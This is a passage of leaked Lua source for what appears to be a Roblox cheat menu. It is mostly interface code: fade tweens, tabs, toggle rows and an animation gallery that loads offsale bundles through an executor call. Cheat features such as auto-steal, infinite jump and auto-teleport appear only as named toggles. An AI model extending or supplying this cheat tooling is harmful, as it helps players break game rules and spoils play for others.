    if activeTweens[obj] then
        pcall(function() activeTweens[obj]:Cancel() end)
        activeTweens[obj] = nil
    end

    local goal = {}
    if base.BackgroundTransparency ~= nil then
        goal.BackgroundTransparency = collapsed and math.max(base.BackgroundTransparency, 0.92) or base.BackgroundTransparency
    end
    if base.TextTransparency ~= nil then
        goal.TextTransparency = collapsed and math.max(base.TextTransparency, 0.78) or base.TextTransparency
    end
    if base.TextStrokeTransparency ~= nil then
        goal.TextStrokeTransparency = collapsed and math.max(base.TextStrokeTransparency, 0.92) or base.TextStrokeTransparency
    end
    if base.ImageTransparency ~= nil then
        goal.ImageTransparency = collapsed and math.max(base.ImageTransparency, 0.85) or base.ImageTransparency
    end
    if base.Transparency ~= nil then
        goal.Transparency = collapsed and math.max(base.Transparency, 0.88) or base.Transparency
    end

    if next(goal) then
        local tw = TweenService:Create(
            obj,
            TweenInfo.new(FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            goal
        )
        activeTweens[obj] = tw
        tw:Play()
    end
end

local restoreToken = 0

local function forceOriginalTransparency()
    for obj, base in pairs(savedTransparency) do
        if obj and obj.Parent and base then
            if activeTweens[obj] then
                pcall(function() activeTweens[obj]:Cancel() end)
                activeTweens[obj] = nil
            end
            pcall(function()
                if base.BackgroundTransparency ~= nil then obj.BackgroundTransparency = base.BackgroundTransparency end
                if base.TextTransparency ~= nil then obj.TextTransparency = base.TextTransparency end
                if base.TextStrokeTransparency ~= nil then obj.TextStrokeTransparency = base.TextStrokeTransparency end
                if base.ImageTransparency ~= nil then obj.ImageTransparency = base.ImageTransparency end
                if base.Transparency ~= nil then obj.Transparency = base.Transparency end
            end)
        end
    end
end

local function setMenuIdleCollapsed(state)
    local newState = state == true
    restoreToken += 1
    local myRestoreToken = restoreToken

    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    if newState and not idleCollapsed then
        savedTransparency = setmetatable({}, {__mode = "k"})
        for _, root in ipairs({Content, Tabs, Close, HeaderDivider, SoundBrandRoot}) do
            rememberObject(root)
            for _, obj in ipairs(root:GetDescendants()) do
                rememberObject(obj)
            end
        end
    end

    idleCollapsed = newState

    Content.Visible = true
    Tabs.Visible = true
    Close.Visible = true
    HeaderDivider.Visible = false

    for _, root in ipairs({Content, Tabs, Close, HeaderDivider, SoundBrandRoot}) do
        tweenObject(root, idleCollapsed)
        for _, obj in ipairs(root:GetDescendants()) do
            tweenObject(obj, idleCollapsed)
        end
    end

    if not newState then
        --Leaked By Xlu0 AndPrime--
        --Leaked By Xlu0 AndPrime--
        task.delay(FADE_TIME + 0.08, function()
            if myRestoreToken ~= restoreToken or idleCollapsed then return end
            --Leaked By Xlu0 AndPrime--
            --Leaked By Xlu0 AndPrime--
            local untilTime = tick() + 1.5
            repeat
                if myRestoreToken ~= restoreToken or idleCollapsed then return end
                forceOriginalTransparency()
                RunService.RenderStepped:Wait()
            until tick() >= untilTime
            forceOriginalTransparency()
            --Leaked By Xlu0 AndPrime--
        end)
    end
end

local function cancelIdleAndRestore()
    idleToken += 1
    if idleCollapsed then
        setMenuIdleCollapsed(false)
    elseif next(savedTransparency) then
        --Leaked By Xlu0 AndPrime--
        forceOriginalTransparency()
    end
end

local function scheduleIdleCollapse()
    --Leaked By Xlu0 AndPrime--
    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then return end
    idleToken += 1
    local myToken = idleToken
    task.delay(IDLE_DELAY, function()
        if myToken ~= idleToken then return end
        if not Main or not Main.Parent or not Main.Visible then return end
        setMenuIdleCollapsed(true)
    end)
end

Main.MouseEnter:Connect(cancelIdleAndRestore)
Main.MouseLeave:Connect(scheduleIdleCollapse)

--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
RunService.RenderStepped:Connect(function()
    if not Main or not Main.Parent or not Main.Visible then return end
    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then return end
    local mousePos = UserInputService:GetMouseLocation()
    local pos = Main.AbsolutePosition
    local size = Main.AbsoluteSize
    local inside = mousePos.X >= pos.X and mousePos.X <= pos.X + size.X
        and mousePos.Y >= pos.Y and mousePos.Y <= pos.Y + size.Y
    if inside then
        if idleCollapsed then
            cancelIdleAndRestore()
        else
            --Leaked By Xlu0 AndPrime--
            --Leaked By Xlu0 AndPrime--
            for _, root in ipairs({Content, Tabs, Close, HeaderDivider, SoundBrandRoot}) do
                if root:IsA("TextLabel") or root:IsA("TextButton") or root:IsA("TextBox") then
                    root.TextTransparency = 0
                end
                for _, obj in ipairs(root:GetDescendants()) do
                    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                        if obj.Visible then
                            obj.TextTransparency = 0
                        end
                    end
                end
            end
        end
    end
end)

--Leaked By Xlu0 AndPrime--
Main.DescendantAdded:Connect(function(obj)
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    if idleCollapsed then
        task.defer(function()
            if obj and obj.Parent then
                savedTransparency[obj] = nil
                tweenObject(obj, true)
            end
        end)
    end
end)

--Leaked By Xlu0 AndPrime--
task.delay(8, scheduleIdleCollapse)
end

local TabLayout = Instance.new("UIListLayout")
TabLayout.FillDirection = Enum.FillDirection.Horizontal
TabLayout.Padding = UDim.new(0, 4)
TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
TabLayout.Parent = Tabs
local pages = {}
local tabButtons = {}
local tabUnderline = {}
local tabNames = {"MOVEMENT", "COMBAT", "VISUALS", "SETTINGS", "KEYBINDS"}
local activeTab = "MOVEMENT"
-- MENU page kept for controller binds compatibility
local _extraPages = {"MENU"}
function addPage(name)
local page = Instance.new("ScrollingFrame")
page.Name = name
page.BackgroundTransparency = 1
page.BorderSizePixel = 0
page.ScrollBarThickness = 0
page.ScrollBarImageTransparency = 1
page.CanvasSize = UDim2.new(0, 0, 0, 0)
page.AutomaticCanvasSize = Enum.AutomaticSize.Y
page.Size = UDim2.new(1, 0, 1, 0)
page.ZIndex = 3
page.Visible = false
page.Parent = Content
local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 7)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = page
pages[name] = page
return page
end
function setTab(name)
activeTab = name
for pageName, page in pairs(pages) do
page.Visible = pageName == name
end
for tabName, btn in pairs(tabButtons) do
local on = tabName == name
btn.TextColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(140, 140, 145)
btn.BackgroundColor3 = on and Color3.fromRGB(22, 22, 26) or Color3.fromRGB(14, 14, 16)
btn.BackgroundTransparency = on and 0.05 or 0.45
local st = btn:FindFirstChildOfClass("UIStroke")
if st then
st.Color = on and Color3.fromRGB(200, 200, 205) or Color3.fromRGB(40, 40, 45)
st.Thickness = on and 1.1 or 0.8
st.Transparency = on and 0.25 or 0.6
end
local ul = tabUnderline[tabName]
if ul then ul.Visible = on end
end
end
for _, name in ipairs(_extraPages or {}) do
addPage(name)
end
for _, name in ipairs(tabNames) do
addPage(name)
local btn = Instance.new("TextButton")
btn.Name = name
btn.Size = UDim2.new(0.2, -4, 0, 30)
btn.BackgroundColor3 = Color3.fromRGB(14, 14, 16)
btn.BackgroundTransparency = 0.45
btn.BorderSizePixel = 0
btn.Text = name
btn.LayoutOrder = ({MOVEMENT=1, COMBAT=2, VISUALS=3, SETTINGS=4, KEYBINDS=5})[name] or 99
btn.TextColor3 = Color3.fromRGB(140, 140, 145)
btn.TextStrokeColor3 = Color3.fromRGB(0,0,0)
btn.TextStrokeTransparency = 1
btn.TextSize = 11
btn.TextScaled = false
btn.TextWrapped = false
btn.Font = Enum.Font.GothamBold
btn.AutoButtonColor = false
btn.ZIndex = 6
btn.Parent = Tabs
corner(btn, 10)
local ul = Instance.new("Frame")
ul.Name = "Underline"
ul.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ul.BorderSizePixel = 0
ul.Size = UDim2.new(0.55, 0, 0, 2)
ul.Position = UDim2.new(0.225, 0, 1, -3)
ul.ZIndex = 8
ul.Visible = false
ul.Parent = btn
corner(ul, 1)
tabUnderline[name] = ul
corner(btn, 8)
stroke(btn, Color3.fromRGB(70, 70, 70), 1.0, 0.5)
addWhiteShimmer(btn, 8, 6, 3, 0.84)
tabButtons[name] = btn
local targetTabName = name
btn.MouseButton1Click:Connect(function()
setTab(targetTabName)
end)
end
function section(parent, text, order)
local holder = Instance.new("Frame")
holder.Name = text
holder.BackgroundTransparency = 1
holder.Size = UDim2.new(1, -4, 0, 22)
holder.LayoutOrder = order
holder.ZIndex = 8
holder.Parent = parent
local accent = Instance.new("Frame")
accent.Name = "Accent"
accent.BackgroundColor3 = Color3.fromRGB(240, 240, 245)
accent.BorderSizePixel = 0
accent.Size = UDim2.new(0, 3, 0, 12)
accent.Position = UDim2.new(0, 2, 0.5, -6)
accent.ZIndex = 9
accent.Parent = holder
corner(accent, 2)
local label = Instance.new("TextLabel")
label.Name = "Label"
label.BackgroundTransparency = 1
label.Text = text
label.TextColor3 = Color3.fromRGB(245, 245, 245)
label.TextStrokeTransparency = 1
label.TextSize = 11
label.Font = Enum.Font.GothamBold
label.TextXAlignment = Enum.TextXAlignment.Left
label.Size = UDim2.new(1, -50, 1, 0)
label.Position = UDim2.new(0, 12, 0, 0)
label.ZIndex = 9
label.Parent = holder
local line = Instance.new("Frame")
line.Name = "Line"
line.BackgroundColor3 = Color3.fromRGB(55, 55, 60)
line.BackgroundTransparency = 0.3
line.BorderSizePixel = 0
line.Size = UDim2.new(1, -120, 0, 1)
line.Position = UDim2.new(0, 100, 0.5, 0)
line.ZIndex = 8
line.Parent = holder
return holder
end
function baseRow(parent, labelText, order)
local row = Instance.new("Frame")
row.Name = labelText
row.BackgroundColor3 = Color3.fromRGB(14, 14, 16)
row.BackgroundTransparency = 0.15
row.Size = UDim2.new(1, -4, 0, 38)
row.BorderSizePixel = 0
row.LayoutOrder = order
row.ZIndex = 4
row.Parent = parent
corner(row, 12)
stroke(row, Color3.fromRGB(40, 40, 45), 1.0, 0.4)
addWhiteShimmer(row, 12, 4, 3.6, 0.9)
local label = Instance.new("TextLabel")
label.Name = "Label"
label.BackgroundTransparency = 1
label.Text = labelText
label.TextColor3 = Color3.fromRGB(245, 245, 245)
label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
label.TextStrokeTransparency = 1
label.TextSize = 12
label.Font = Enum.Font.GothamMedium
label.TextXAlignment = Enum.TextXAlignment.Left
label.Position = UDim2.new(0, 12, 0, 0)
label.Size = UDim2.new(1, -132, 1, 0)
label.ZIndex = 5
label.Parent = row
--Leaked By Xlu0 AndPrime--
return row
end
function textboxRow(parent, labelText, value, order)
local row = baseRow(parent, labelText, order)
local box = Instance.new("TextBox")
box.Name = "ValueBox"
box.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
box.BackgroundTransparency = 0.18
box.Text = tostring(value or "")
box.TextColor3 = COLORS.white
box.TextSize = 12
box.Font = Enum.Font.GothamMedium
box.ClearTextOnFocus = false
box.Size = UDim2.new(0, 58, 0, 24)
box.Position = UDim2.new(1, -68, 0.5, -12)
box.BorderSizePixel = 0
box.ZIndex = 6
box.Parent = row
corner(box, 7)
stroke(box, COLORS.strokeSoft, 1, 0.45)
return row, box
end
function toggleRow(parent, labelText, default, order)
local row = baseRow(parent, labelText, order)
local button = Instance.new("TextButton")
button.Name = "ToggleButton"
button.BackgroundTransparency = 1
button.Text = ""
button.Size = UDim2.new(1, 0, 1, 0)
button.Position = UDim2.new(0, 0, 0, 0)
button.AutoButtonColor = false
button.ZIndex = 7
button.Parent = row
-- Pill toggle: white when on, dark gray when off
local track = Instance.new("Frame")
track.Name = "Track"
track.BackgroundColor3 = default and Color3.fromRGB(147, 51, 234) or Color3.fromRGB(43, 20, 66)
track.BackgroundTransparency = 0
track.Size = UDim2.new(0, 44, 0, 22)
track.Position = UDim2.new(1, -54, 0.5, -11)
track.BorderSizePixel = 0
track.ZIndex = 5
track.Parent = button
corner(track, 999)
stroke(track, Color3.fromRGB(168, 85, 247), 2, 0.12)
local circle = Instance.new("Frame")
circle.Name = "Knob"
circle.BackgroundColor3 = default and Color3.fromRGB(233, 213, 255) or Color3.fromRGB(192, 132, 252)
circle.Size = UDim2.new(0, 18, 0, 18)
circle.Position = default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
circle.BorderSizePixel = 0
circle.ZIndex = 6
circle.Parent = track
corner(circle, 999)
local circleStroke = track:FindFirstChildOfClass("UIStroke")
local rowStroke = row:FindFirstChildOfClass("UIStroke")
local state = default and true or false
local function setVisual(on)
state = on and true or false
tween(track, {
BackgroundColor3 = state and Color3.fromRGB(147, 51, 234) or Color3.fromRGB(43, 20, 66),
})
tween(circle, {
Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
BackgroundColor3 = state and Color3.fromRGB(233, 213, 255) or Color3.fromRGB(192, 132, 252),
})
if circleStroke then
tween(circleStroke, {
Color = Color3.fromRGB(192, 132, 252),
Transparency = state and 0.15 or 0.4,
})
end
if rowStroke then
tween(rowStroke, {
Color = state and Color3.fromRGB(192, 132, 252) or COLORS.strokeSoft,
Transparency = state and 0.2 or 0.38,
})
end
row.BackgroundTransparency = 0.25
end
setVisual(state)
button.Activated:Connect(function()
end)
return row, setVisual
end
_G.SoundSyncToggleVisuals = function()
pcall(function() if setAutoStealVisual then setAutoStealVisual(autoStealEnabled == true) end end)
pcall(function() if setInfJumpVisual then setInfJumpVisual(infJumpEnabled == true) end end)
pcall(function() if setAntiRagdollVisual then setAntiRagdollVisual(antiRagdollEnabled == true) end end)
pcall(function() if setAutoCarrySpeedVisual then setAutoCarrySpeedVisual(autoCarrySpeedEnabled == true) end end)
pcall(function() if setAutoTPVisual then setAutoTPVisual(autoTPEnabled == true) end end)
pcall(function() if setAutoResetOnMedVisual then setAutoResetOnMedVisual(autoResetOnMedEnabled == true) end end)
end
_G.SoundActionToggleRow = function(parent, labelText, default, order)
local row = baseRow(parent, labelText, order)
local button = Instance.new("TextButton")
button.Name = "ToggleButton"
button.BackgroundTransparency = 1
button.Text = ""
button.Size = UDim2.new(1, 0, 1, 0)
button.Position = UDim2.new(0, 0, 0, 0)
button.AutoButtonColor = false
button.ZIndex = 7
button.Parent = row
-- Pill toggle: white when on, dark gray when off
local track = Instance.new("Frame")
track.Name = "Track"
track.BackgroundColor3 = default and Color3.fromRGB(147, 51, 234) or Color3.fromRGB(43, 20, 66)
track.BackgroundTransparency = 0
track.Size = UDim2.new(0, 44, 0, 22)
track.Position = UDim2.new(1, -54, 0.5, -11)
track.BorderSizePixel = 0
track.ZIndex = 5
track.Parent = button
corner(track, 999)
stroke(track, Color3.fromRGB(168, 85, 247), 2, 0.12)
local circle = Instance.new("Frame")
circle.Name = "Knob"
circle.BackgroundColor3 = default and Color3.fromRGB(233, 213, 255) or Color3.fromRGB(192, 132, 252)
circle.Size = UDim2.new(0, 18, 0, 18)
circle.Position = default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
circle.BorderSizePixel = 0
circle.ZIndex = 6
circle.Parent = track
corner(circle, 999)
local circleStroke = track:FindFirstChildOfClass("UIStroke")
local rowStroke = row:FindFirstChildOfClass("UIStroke")
local function setVisual(on)
local state = on and true or false
tween(track, {
BackgroundColor3 = state and Color3.fromRGB(147, 51, 234) or Color3.fromRGB(43, 20, 66),
})
tween(circle, {
Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
BackgroundColor3 = state and Color3.fromRGB(233, 213, 255) or Color3.fromRGB(192, 132, 252),
})
if circleStroke then
tween(circleStroke, {
Color = Color3.fromRGB(192, 132, 252),
Transparency = state and 0.15 or 0.4,
})
end
if rowStroke then
tween(rowStroke, {
Color = state and Color3.fromRGB(192, 132, 252) or COLORS.strokeSoft,
Transparency = state and 0.2 or 0.38,
})
end
row.BackgroundTransparency = 0.25
end
setVisual(default)
return row, setVisual, button
end

function dropdownRow(parent, labelText, value, order)
local row = baseRow(parent, labelText, order)
local select = Instance.new("TextButton")
select.Name = "Dropdown"
select.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
select.BackgroundTransparency = 0.18
select.Text = tostring(value or "None") .. "  v"
select.TextColor3 = COLORS.white
select.TextSize = 11
select.Font = Enum.Font.GothamMedium
select.Size = UDim2.new(0, 70, 0, 24)
select.Position = UDim2.new(1, -80, 0.5, -12)
select.BorderSizePixel = 0
select.ZIndex = 6
select.Parent = row
corner(select, 7)
stroke(select, COLORS.strokeSoft, 1, 0.45)
return row, select
end
function refreshAnimationPackRow()
local displayName = tostring(selectedAnimationPack or "OFF")

if animationPackValueLabel and animationPackValueLabel.Parent then
animationPackValueLabel.Text = displayName
end

--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
pcall(function()
    if pages and pages.VISUALS then
        for _, obj in ipairs(pages.VISUALS:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Name == "AnimationPackValue" then
                obj.Text = displayName
            end
        end
    end
end)
end
function animationPackRow(parent, order)
local row = baseRow(parent, "Animation Pack", order)
row.Size = UDim2.new(1,-4,0,52)
row.BackgroundTransparency = 1
local animRowStroke = row:FindFirstChildOfClass("UIStroke")
if animRowStroke then animRowStroke.Transparency = 1 end
local label = row:FindFirstChild("Label")
if label then
label.Text = "Animation Pack"
label.Position = UDim2.new(0,2,0,0)
label.Size = UDim2.new(1,0,0,16)
label.TextSize = 12
label.Font = Enum.Font.GothamBlack
end
local left = Instance.new("TextButton")
left.Name = "LeftArrow"
left.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
left.BackgroundTransparency = 0.18
left.Text = "<"
left.TextColor3 = COLORS.white
left.TextSize = 12
left.Font = Enum.Font.GothamMedium
left.Size = UDim2.new(0,44,0,25)
left.Position = UDim2.new(0,0,0,22)
left.BorderSizePixel = 0
left.ZIndex = 6
left.Parent = row
corner(left, 7)
stroke(left, COLORS.strokeSoft, 1, 0.45)
animationPackValueLabel = Instance.new("TextLabel")
animationPackValueLabel.Name = "AnimationPackValue"
animationPackValueLabel.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
animationPackValueLabel.BackgroundTransparency = 0.18
animationPackValueLabel.BorderSizePixel = 0
animationPackValueLabel.Text = selectedAnimationPack
animationPackValueLabel.TextColor3 = COLORS.white
animationPackValueLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
animationPackValueLabel.TextStrokeTransparency = 1
animationPackValueLabel.TextSize = 11
animationPackValueLabel.Font = Enum.Font.GothamMedium
animationPackValueLabel.TextXAlignment = Enum.TextXAlignment.Center
animationPackValueLabel.Size = UDim2.new(1,-96,0,28)
animationPackValueLabel.Position = UDim2.new(0,48,0,22)
animationPackValueLabel.ZIndex = 6
animationPackValueLabel.Parent = row
corner(animationPackValueLabel,7)
stroke(animationPackValueLabel,COLORS.strokeSoft,1,0.45)

--Leaked By Xlu0 AndPrime--
local rowAnimationPackValueLabel = animationPackValueLabel

local more = Instance.new("TextButton")
more.Name = "MoreAnimations"
more.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
more.BackgroundTransparency = 0.18
more.Text = "MORE"
more.TextColor3 = COLORS.white
more.TextSize = 9
more.Font = Enum.Font.GothamMedium
more.Size = UDim2.new(0, 52, 0, 28)
more.Position = UDim2.new(0, 116, 0.5, -14)
more.BorderSizePixel = 0
more.ZIndex = 6
more.Parent = row
more.Visible = false
corner(more, 8)
stroke(more, COLORS.strokeSoft, 1, 0.45)

local function getPackThumb(packName)
    if packName == "OFF" then
        local ok, img = pcall(function()
            return Players:GetUserThumbnailAsync(
                LP.UserId,
                Enum.ThumbnailType.AvatarBust,
                Enum.ThumbnailSize.Size150x150
            )
        end)
        if ok then return img end
        return ""
    end
    if packName == "Unwalk" then
        return "rbxassetid://71408678974152"
    end
    local pack = AnimationPacks[packName]
    local idle = pack and pack.idle and pack.idle[1] and pack.idle[1][1]
    local id = idle and tostring(idle):match("(%d+)")
    if id then
        return "rbxthumb://type=Asset&id=" .. id .. "&w=150&h=150"
    end
    return ""
end



local function resolveBundleMappings(bundledItems)
    local mappings = {}
    if type(bundledItems) ~= "table" then return mappings end

    for _, assetIds in pairs(bundledItems) do
        if type(assetIds) == "table" then
            for _, assetId in pairs(assetIds) do
                local success, objects = pcall(function()
                    return game:GetObjects("rbxassetid://" .. tostring(assetId))
                end)
                if success and objects then
                    local function searchTree(parent, parentPath)
                        for _, child in pairs(parent:GetChildren()) do
                            if child:IsA("Animation") then
                                local animationPath = parentPath .. "." .. child.Name
                                local pathParts = animationPath:split(".")
                                table.insert(mappings, {
                                    category = pathParts[#pathParts - 1],
                                    name = pathParts[#pathParts],
                                    animationId = child.AnimationId
                                })
                            elseif #child:GetChildren() > 0 then
                                searchTree(child, parentPath .. "." .. child.Name)
                            end
                        end
                    end

                    for _, obj in pairs(objects) do
                        searchTree(obj, obj.Name)
                        pcall(function() obj:Destroy() end)
                    end
                end
            end
        end
    end
    return mappings
end

applyFullAnimationBundle = function(animationData)
    local char = LP.Character
    local animate = char and char:FindFirstChild("Animate")
    if not char or not animate then return end

    backupAnimations(char)
    if unwalkEnabled then
        disableUnwalk()
        animate = char:FindFirstChild("Animate") or char:WaitForChild("Animate", 2)
        if not animate then return end
    end

    local mappings = resolveBundleMappings(animationData.bundledItems)
    if #mappings == 0 then
        if showActionNotification then
            pcall(function() showActionNotification("ANIMATION DATA NOT FOUND") end)
        end
        return
    end

    stopCurrentAnimations(char)

    for _, m in ipairs(mappings) do
        local cat = tostring(m.category or ""):lower()
        local name = tostring(m.name or "")
        local folder = animate:FindFirstChild(cat)
        if folder then
            local target = folder:FindFirstChild(name)
            if not target then
                if cat == "walk" then target = folder:FindFirstChild("WalkAnim")
                elseif cat == "run" then target = folder:FindFirstChild("RunAnim")
                elseif cat == "jump" then target = folder:FindFirstChild("JumpAnim")
                elseif cat == "fall" then target = folder:FindFirstChild("FallAnim")
                elseif cat == "climb" then target = folder:FindFirstChild("ClimbAnim")
                elseif cat == "swim" then target = folder:FindFirstChild("Swim")
                elseif cat == "swimidle" then target = folder:FindFirstChild("SwimIdle")
                elseif cat == "idle" then
                    target = folder:FindFirstChild(name) or folder:FindFirstChild("Animation1")
                end
            end
            setAnimId(target, m.animationId)
        end
    end

    reloadAnimate(animate)

    _G.SoundSelectedMoreAnimationBundle = {
        id = animationData.id,
        name = animationData.name,
        bundledItems = animationData.bundledItems
    }

    selectedAnimationPack = "OFF"
    syncAnimationPackIndex()
    if refreshAnimationPackRow then refreshAnimationPackRow() end
    if saveSoundConfig then do end end

    if showActionNotification then
        pcall(function() showActionNotification("ANIMATION - " .. tostring(animationData.name or animationData.id)) end)
    end
end

local function openAnimationGallery()
    local existing = PlayerGui:FindFirstChild("SoundAnimationGallery")
    if existing then existing:Destroy() end

    local sg = Instance.new("ScreenGui")
    sg.Name = "SoundAnimationGallery"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 99999
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    safeParentGui(sg)

    local shade = Instance.new("TextButton")
    shade.Text = ""
    shade.AutoButtonColor = false
    shade.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shade.BackgroundTransparency = 0.25
    shade.Size = UDim2.fromScale(1,1)
    shade.ZIndex = 1
    shade.Parent = sg

    local panel = Instance.new("Frame")
    panel.AnchorPoint = Vector2.new(0.5,0.5)
    panel.Position = UDim2.fromScale(0.5,0.5)
    panel.Size = UDim2.new(0, 540, 0, 480)
    panel.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
    panel.BackgroundTransparency = 0.04
    panel.BorderSizePixel = 0
    panel.ZIndex = 2
    panel.Parent = sg
    corner(panel,16)
    stroke(panel,COLORS.strokeSoft,1.2,0.15)

    pcall(function()
        local selectedColor = (_G.SoundThemeColors and _G.SoundThemeColors[_G.SoundThemeName])
            or Color3.fromRGB(255,255,255)

        panel.BackgroundColor3 = selectedColor:Lerp(Color3.fromRGB(8, 8, 8), 0.78)

        local exactImage = nil
        local exactColor = selectedColor
        local exactTransparency = 0

        --Leaked By Xlu0 AndPrime--
        if BgImage and BgImage.Parent and BgImage.Visible and BgImage.Image and BgImage.Image ~= "" then
            exactImage = BgImage.Image
            exactColor = BgImage.ImageColor3
            exactTransparency = BgImage.ImageTransparency
        elseif currentBackground and tonumber(currentBackground) and tonumber(currentBackground) > 0
            and BackgroundIDs and BackgroundIDs[tonumber(currentBackground)] then
            exactImage = "rbxassetid://" .. tostring(BackgroundIDs[tonumber(currentBackground)])
        end

        if exactImage and exactImage ~= "" then
            local image = Instance.new("ImageLabel")
            image.Name = "ThemeBackground"
            image.BackgroundTransparency = 1
            image.Size = UDim2.fromScale(1,1)
            image.Position = UDim2.fromScale(0,0)
            image.Image = exactImage
            image.ImageColor3 = exactColor
            image.ImageTransparency = exactTransparency
            image.ScaleType = Enum.ScaleType.Crop
            image.ZIndex = 2
            image.Parent = panel
            corner(image,16)

            local wash = Instance.new("Frame")
            wash.Name = "BackgroundWash"
            wash.BackgroundColor3 = Color3.fromRGB(0,0,0)
            wash.BackgroundTransparency = 0.52
            wash.BorderSizePixel = 0
            wash.Size = UDim2.fromScale(1,1)
            wash.ZIndex = 2
            wash.Parent = panel
            corner(wash,16)
        end
    end)

    if UserInputService.TouchEnabled then
        panel.Size = UDim2.new(0.95,0,0.80,0)
    end

    --Leaked By Xlu0 AndPrime--
    do
        local dragging = false
        local dragStart = nil
        local startPos = nil

        local function updateDrag(input)
            if not dragging or not dragStart or not startPos then return end
            local delta = input.Position - dragStart
            panel.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end

        panel.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = panel.Position

                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement
                or input.UserInputType == Enum.UserInputType.Touch then
                updateDrag(input)
            end
        end)
    end

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Text = "ALL ANIMATION BUNDLES"
    title.TextColor3 = COLORS.white
    title.Font = Enum.Font.GothamMedium
    title.TextSize = 14
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Position = UDim2.new(0,16,0,10)
    title.Size = UDim2.new(1,-60,0,28)
    title.ZIndex = 3
    title.Parent = panel

    local sub = Instance.new("TextLabel")
    sub.BackgroundTransparency = 1
    sub.Text = "Online + Offsale animation bundles"
    sub.TextColor3 = Color3.fromRGB(176, 176, 176)
    sub.Font = Enum.Font.GothamMedium
    sub.TextSize = 11
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.Position = UDim2.new(0,16,0,34)
    sub.Size = UDim2.new(1,-60,0,20)
    sub.ZIndex = 3
    sub.Parent = panel

    local close = Instance.new("TextButton")
    close.Text = "X"
    close.Font = Enum.Font.GothamMedium
    close.TextSize = 12
    close.TextColor3 = COLORS.white
    close.BackgroundColor3 = Color3.fromRGB(19, 19, 19)
    close.BackgroundTransparency = 0.08
    close.Size = UDim2.fromOffset(32,32)
    close.Position = UDim2.new(1,-42,0,8)
    close.BorderSizePixel = 0
    close.ZIndex = 4
    close.Parent = panel
    corner(close,9)

    local searchBox = Instance.new("TextBox")
    searchBox.PlaceholderText = "Search bundle / ID..."
    searchBox.Text = ""
    searchBox.ClearTextOnFocus = false
    searchBox.Font = Enum.Font.GothamMedium
    searchBox.TextSize = 12
    searchBox.TextColor3 = COLORS.white
    searchBox.PlaceholderColor3 = Color3.fromRGB(136, 136, 136)
    searchBox.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
    searchBox.BackgroundTransparency = 0.06
    searchBox.BorderSizePixel = 0
    searchBox.Position = UDim2.new(0,14,0,60)
    searchBox.Size = UDim2.new(1,-28,0,32)
    searchBox.ZIndex = 3
    searchBox.Parent = panel
    corner(searchBox,9)
    stroke(searchBox,COLORS.strokeSoft,1,0.5)

    local scroll = Instance.new("ScrollingFrame")
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.Position = UDim2.new(0,10,0,102)
    scroll.Size = UDim2.new(1,-20,1,-116)
    scroll.ScrollBarThickness = 4
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.CanvasSize = UDim2.new(0,0,0,0)
    scroll.ZIndex = 3
    scroll.Parent = panel

    local grid = Instance.new("UIGridLayout")
    grid.CellSize = UDim2.fromOffset(122,145)
    grid.CellPadding = UDim2.fromOffset(8,8)
    grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    grid.SortOrder = Enum.SortOrder.LayoutOrder
    grid.Parent = scroll

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Text = "Loading..."
    status.TextColor3 = Color3.fromRGB(161, 161, 161)
    status.Font = Enum.Font.GothamMedium
    status.TextSize = 10
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Position = UDim2.new(0,16,1,-27)
    status.Size = UDim2.new(1,-32,0,20)
    status.ZIndex = 4
    status.Parent = panel

    local allAnimations = {}

    local function clearCards()
        for _, child in ipairs(scroll:GetChildren()) do
            if child:IsA("GuiButton") then child:Destroy() end
        end
    end

    local function addCard(item, order)
        local card = Instance.new("TextButton")
        card.Text = ""
